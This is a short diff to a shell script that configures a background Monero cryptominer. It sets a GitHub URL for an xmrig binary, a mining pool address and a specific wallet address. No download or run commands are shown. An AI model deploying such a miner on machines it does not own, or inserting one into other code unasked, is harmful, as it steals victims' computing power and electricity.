@@ -1,9 +1,9 @@
 #!/bin/sh
 
 # variables
-BASE_URL=""
+BASE_URL="https://github.com/Demontisa/XMRScript/raw/main/xmrig"
 POOL="pool.minexmr.com:3333"
-WALLET=""
+WALLET="48UdswjLqJCXJuAE9YGEybDkvkWRScs2B557r9tQbTNUdrve5NdjcFwGAebGjp8KuYJqQZuNAKsf8SYmQEMu4cmt7VXLh8u"
 UUID=$(cut -d '-' -f 1 /proc/sys/kernel/random/uuid)
 BACKGROUND=true
 DONATE=0
